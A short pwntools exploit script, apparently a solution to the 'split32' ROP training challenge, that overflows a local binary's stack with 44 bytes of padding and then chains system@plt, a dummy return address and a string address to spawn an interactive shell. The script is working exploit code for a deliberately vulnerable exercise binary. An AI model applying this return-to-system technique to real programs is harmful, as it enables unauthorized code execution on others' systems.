from pwn import *
target=process('./split32')

string=0x0804A030
system_plt=0x08048430

#ropchain

#initial payload
payload="A"*44

#final payload with bogus return address
payload+=p32(system_plt)
payload+=p32(0xdeadbeef)
payload+=p32(string)

target.sendline(payload)
target.interactive()
